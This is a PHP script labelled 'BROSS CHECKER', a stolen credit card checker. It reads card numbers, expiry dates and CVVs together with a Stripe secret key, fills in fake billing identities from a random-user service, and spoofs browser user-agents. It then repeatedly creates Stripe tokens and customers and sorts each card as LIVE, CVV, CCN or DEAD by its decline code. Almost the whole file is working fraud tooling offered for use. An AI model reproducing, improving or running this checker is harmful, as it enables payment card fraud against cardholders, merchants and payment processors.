<?php
//===================== [ BROSS CHECKER ] ====================//
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
//================ [ FUNCTIONS & LISTA ] ===============//
function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}
function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };
//////////
function handleError() {
  // Do something to handle the error, such as logging it or displaying an error message to the user
  error_log('Error occurred while making the HTTP request');
}

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
    $amt = '1';
    $chr = $amt * 100;
}
switch ($amt) {
  case '1':
  $amt = '100';
    break;
  case '0.5':
  $amt= '050';
  break;
    case '0.6':
  $amt= '060';
  break;
    case '0.7':
  $amt= '070';
  break;
    case '0.8':
  $amt= '080';
  break;
    case '0.9':
  $amt= '090';
  break;
  case '2':
  $amt = '200';
    break;
  case '3':
  $amt = '300';
    break;
  case '4':
  $amt = '400';
    break;
  case '5':
  $amt = '500';
    break;
  case '6':
  $amt = '600';
    break;
  case '7':
  $amt = '700';
    break;
  case '8':
  $amt = '800';
    break;
    case '9':
    $amt = '900';
    break;
    case '10':
    $amt = '1000';
    break;
}
if (strlen($amt) == 1) $amt = "$amt00";
if (strlen($amt) == 2) $amt = "$amt0";
$sk = $_GET['skgate'];
$lista = $_GET['lista'];
$crn = $_GET['crn'];
if(empty($crn)) {
    $crn = 'usd';
}
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
////////////=================[BIN DATA]================///////////////////
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch); 
$emoji = GetStr($fim, '"emoji":"', '"'); 
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($ch);

#########################

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);

$bindata1 = "$type - $brand - $country $emoji<br>$bank<br>$status ";

#########################[Randomizing Details]############################

        $get = file_get_contents('https://randomuser.me/api/1.3/?nat='.$country.'');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];

///////////////////////////////////////////////////////////////////////////////////////////////////
$rate_limit_reached = false;
$loop_count = 0;
while (!$rate_limit_reached) {
  $loop_count++;
//================= [ CURL REQUESTS ] =================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$firstname.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_line1]='.$street.'200&card[address_line2]=Apartment&card[address_city]='.$city.'&card[address_state]='.$state.'&card[address_zip]='.$zip.'&card[address_country]='.$country.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r1 = curl_exec($ch);
$tok = trim(strip_tags(getstr($r1,'"id": "','"')));
$cvc1 = trim(strip_tags(getStr($r1,'"cvc_check": "','"')));
$rl1 = trim(strip_tags(getStr($r1,'"risk_level": "','"')));
$country1 = Getstr($r1, ' "country": "','"');
$type1 = Getstr($r1, ' "funding": "','"');

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[email]='.$email.'&source='.$tok.'');

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Authorization: Bearer '.$sk.'',
'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).''));

$r2 = curl_exec($ch);
$cus = trim(strip_tags(getstr($r2,'"id": "','"')));
$cvc2 = trim(strip_tags(getStr($r2,'"cvc_check": "','"')));
$rl2 = trim(strip_tags(getStr($r2,'"risk_level": "','"')));
############[3 Req]#############




$ci1 = "type=$type1 - country = $country1";



if (strpos($r1, '"rate_limit"') !== false || strpos($r2, '"rate_limit"') !== false || strpos($r2, '"processing_error"') !== false || strpos($r1, '"processing_error"') !== false || (strpos($r2, '"try_again_later"') !== false || strpos($r2, '"parameter_invalid_integer"') !== false || strpos($r3, '"rate_limit"' !== false))) 
{
    $rate_limit_reached = false; 
}

elseif(strpos($r2,'"cvc_check": "pass"')){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r1,'"cvc_check": "pass"')){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
########## 1 ###########
elseif(strpos($r2, "insufficient_funds" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>LIVE='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "fraudulent" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "do_not_honor" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CCV:'.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "lost_card")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "pickup_card")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2,' "code": "invalid_cvc"')){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CCN='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2,"invalid_expiry_month")){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2,"invalid_account")){
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r3, "transaction_not_allowed")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "card_error_authentication_required")) {
  $rate_limit_reached = true;
      echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
} 
elseif(strpos($r2, "authentication_required")) {
  $rate_limit_reached = true;
      echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
} 
elseif(strpos($r2, 'Your card has expired.')) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CVV='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']<br>you can use it on a trile</span><br>';
}
elseif(strpos($r2, "card_decline_rate_limit_exceeded")) {
  $rate_limit_reached = true;
  echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, ' "message": "Your card number is incorrect."')) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, '"decline_code": "generic_decline"')) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CCN='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "incorrect_number")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
} 
elseif(strpos($r2, "invalid_number")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CNN:'.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r2, "generic_decline")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CCN='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r1, "testmode_charges_only" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r1, "api_key_expired" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r1, "card_not_supported" )) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
elseif(strpos($r1, "generic_decline")) {
  $rate_limit_reached = true;
    echo '<span style="color:red">========================================<br>CCN='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
}
else{
    echo '<span style="color:red">========================================<br>DEAD='.$lista.'<br>[Result(R2): '.$resp2.']['.$msg2.']<br>['.$ci1.']</span><br>';
     
}
}